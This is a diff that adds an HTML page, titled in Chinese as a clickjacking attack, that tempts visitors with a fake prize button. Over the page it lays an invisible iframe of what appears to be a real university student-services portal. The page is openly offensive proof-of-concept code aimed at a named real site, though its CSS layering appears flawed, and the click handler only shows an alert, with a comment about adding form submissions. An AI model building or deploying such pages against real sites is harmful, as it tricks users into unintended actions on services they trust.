@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>点击劫持攻击</title>
+    <style>
+        /* 设置页面居中，掩盖 iframe */
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 20%;
+            background-color: #f4f4f4;
+            font-size: 24px;
+        }
+
+        .iframe-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.5); /* 半透明背景 */
+            z-index: 2;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0; /* 隐藏 iframe */
+            pointer-events: none; /* 禁止 iframe 内部的交互 */
+        }
+
+        /* 伪装按钮 */
+        .attack-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 1;  /* 确保按钮位于 iframe 之上 */
+        }
+
+        /* 鼠标悬停效果 */
+        .attack-button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>点击这里以获得特别优惠！</h1>
+    <p>点击下面的按钮来获取您期待的奖励！</p>
+
+    <!-- 隐藏 iframe，嵌入目标页面 -->
+    <div class="iframe-container">
+        <iframe src="https://xg.stu.edu.cn/xsfw/sys/emaphome/portal/index.do" id="targetIframe"></iframe>
+    </div>
+
+    <!-- 隐藏的按钮，诱导用户点击 -->
+    <button class="attack-button" onclick="performAttack()">点击我！</button>
+
+    <script>
+        // 按钮点击的处理函数
+        function performAttack() {
+            alert("您刚刚无意间执行了目标网站上的操作！");
+            // 这里可以添加更多的操作，比如提交表单或点击按钮等
+        }
+    </script>
+</body>
+</html>
